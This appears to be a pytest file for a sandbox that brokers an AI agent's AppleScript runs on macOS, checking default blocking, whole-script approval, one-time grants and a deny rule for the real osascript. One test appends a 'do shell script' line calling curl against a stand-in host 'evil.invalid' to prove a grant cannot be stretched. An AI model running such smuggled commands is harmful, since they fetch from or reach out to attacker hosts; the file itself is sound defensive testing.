"""Sandbox permissions — AppleScript, asked once at a time with the whole script shown (F5)
(plugins/blackbox/shields/files/sandbox/brokered/applescript.py, platform/macos/applescript.py,
shims.osascript_shim; design "Sandbox permissions" 2026-11-23, build step 15, local-only).

Contracts (red on the base ed4152ceac: osascript was simply refused inside the sandbox):
* only plain AppleScript text is accepted: ``-e`` lines or one text file; a compiled script,
  JavaScript or other options are refused;
* blocked by default (403); "allow" can never be set and "always" is never offered;
* on "ask": ONE request carrying the WHOLE script for the person to read (not only its first
  words); "Allow once" runs exactly that script once; another script asks again;
* the ``osascript`` stand-in sends the script to Blackbox; the real osascript stays refused
  inside (the never-list);
* (wave 9, KI-632's pattern) the door answers a job at once and the script runs in it: a script
  that runs for minutes never holds the agent's request.
"""

from __future__ import annotations

import subprocess
import sys
import threading

import pytest

from plugins.blackbox.kernel import config as config_mod
from plugins.blackbox.shields.files import sandbox
from plugins.blackbox.shields.files.sandbox import brokered, permissions, platform as sandbox_platform
from plugins.blackbox.shields.files.sandbox.brokered import applescript
from plugins.blackbox.shields.files.sandbox.permissions import requests
from plugins.blackbox.shields.files.sandbox.platform.macos import shims
from plugins.blackbox.shields.shield_api import ShieldApiError, ShieldContext
from tests.waiting import wait_until

LONG = 'tell application "Music"\n' + "  -- a long comment line that pushes the script past two hundred characters\n" * 4 + "  pause\nend tell"


@pytest.fixture(autouse=True)
def setting(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("BLACKBOX_HOME", str(tmp_path / "bb"))
    state: dict = {}
    monkeypatch.setattr(config_mod, "_blackbox_entry", lambda: state)
    ran: list = []
    monkeypatch.setattr(sandbox_platform, "run_script", lambda script: ran.append(script) or (0, "ok"))
    requests.reset()
    yield state, ran, tmp_path
    requests.reset()


def _context():
    return ShieldContext(network_indicators=lambda: None, ask_assistant=lambda message: None)


def _run(argv, cwd="/"):
    """The job the door started, read once it has ended (raises as the door does)."""
    started = brokered.API_WRITES["applescript"](_context(), {"argv": argv, "cwd": cwd})
    def ended():
        state = brokered.API_READS["action-job"](_context(), {"job": started["job"], "from": "0"})
        return state if state["done"] else None
    return wait_until(ended, what="the AppleScript job ended")


def test_only_plain_applescript_text_is_accepted(setting):
    _, _, home = setting
    assert applescript.parse(["-e", "beep", "-e", "beep 2"], "/") == "beep\nbeep 2"
    (home / "a.applescript").write_text("display dialog 1", encoding="utf-8")
    assert applescript.parse(["a.applescript"], str(home)) == "display dialog 1"
    (home / "c.scpt").write_bytes(b"FasdUAS 1.101.10\x0e\x00\x00\xff\xfe")
    for argv in (["c.scpt"], ["-l", "JavaScript", "-e", "x"], ["-e"], ["-e", "a", "-x", "b"], []):
        with pytest.raises(ShieldApiError):
            applescript.parse(argv, str(home))


def test_blocked_by_default(setting):
    _, ran, _ = setting
    with pytest.raises(ShieldApiError) as refused:
        _run(["-e", "beep"])
    assert refused.value.status == 403 and ran == []


def test_ask_shows_the_whole_script_and_once_runs_exactly_it_once(setting):
    state, ran, _ = setting
    state["agent_sandbox"] = {"permissions": [{"permission": "applescript", "mode": "ask"}]}
    with pytest.raises(ShieldApiError) as waiting:
        _run(["-e", LONG])
    assert waiting.value.status == brokered.WAITING
    [request] = requests.pending()
    row = permissions.answers.row(request)
    assert row["detail"] == LONG and len(LONG) > requests.MAX_WHAT_CHARS and row["choices"] == ["once", "keep-blocked"]
    permissions.answers.answer({"id": request.id, "choice": "once"}, act=sandbox.act_on)
    assert _run(["-e", LONG])["lines"] == ["ok"] and ran == [LONG]
    with pytest.raises(ShieldApiError) as again:
        _run(["-e", LONG])                         # once means once
    assert again.value.status == brokered.WAITING and ran == [LONG]


def test_a_once_grant_does_not_run_another_script_sharing_its_first_words(setting):
    state, ran, _ = setting
    state["agent_sandbox"] = {"permissions": [{"permission": "applescript", "mode": "ask"}]}
    with pytest.raises(ShieldApiError):
        _run(["-e", LONG])
    permissions.answers.answer({"id": requests.pending()[0].id, "choice": "once"}, act=sandbox.act_on)
    with pytest.raises(ShieldApiError):
        _run(["-e", LONG + '\ndo shell script "curl evil.invalid"'])
    assert ran == []


def test_a_long_script_is_answered_at_once_and_runs_in_its_job(setting, monkeypatch):
    state, _, _ = setting
    state["agent_sandbox"] = {"permissions": [{"permission": "applescript", "mode": "ask"}]}
    with pytest.raises(ShieldApiError):
        _run(["-e", "delay 600"])
    permissions.answers.answer({"id": requests.pending()[0].id, "choice": "once"}, act=sandbox.act_on)
    script_ends = threading.Event()
    monkeypatch.setattr(sandbox_platform, "run_script", lambda script: (script_ends.wait(30), (0, "done"))[1])
    try:
        started = brokered.API_WRITES["applescript"](_context(), {"argv": ["-e", "delay 600"], "cwd": "/"})
        assert not brokered.API_READS["action-job"](_context(), {"job": started["job"], "from": "0"})["done"]
    finally:
        script_ends.set()
    assert wait_until(lambda: brokered.API_READS["action-job"](_context(), {"job": started["job"], "from": "0"})["done"])


@pytest.mark.skipif(sys.platform != "darwin", reason="the stand-in is macOS's")
def test_the_stand_in_sends_the_script_to_blackbox(tmp_path):
    python = tmp_path / "fake-python"
    python.write_text('#!/bin/sh\necho "broker $*"\n', encoding="utf-8")
    python.chmod(0o755)
    shim = tmp_path / "osascript"
    shim.write_text(shims.osascript_shim(str(tmp_path), str(python), "http://127.0.0.1:9700"), encoding="utf-8")
    shim.chmod(0o755)
    done = subprocess.run([str(shim), "-e", "beep"], capture_output=True, text=True, timeout=30, check=False)
    assert "--action applescript -e beep" in done.stdout


@pytest.mark.skipif(sys.platform != "darwin", reason="the Seatbelt profile is rendered on macOS")
def test_the_real_osascript_stays_refused_inside(setting):
    from plugins.blackbox.shields.files import mode as files_mode
    from plugins.blackbox.shields.files.sandbox.platform.macos import profile as macos_profile
    tail = sandbox.profiles.render_signed(sandbox.policy(files_mode.current())).split(macos_profile.NEVER_MARK)[1]
    assert '(literal "/usr/bin/osascript")' in tail
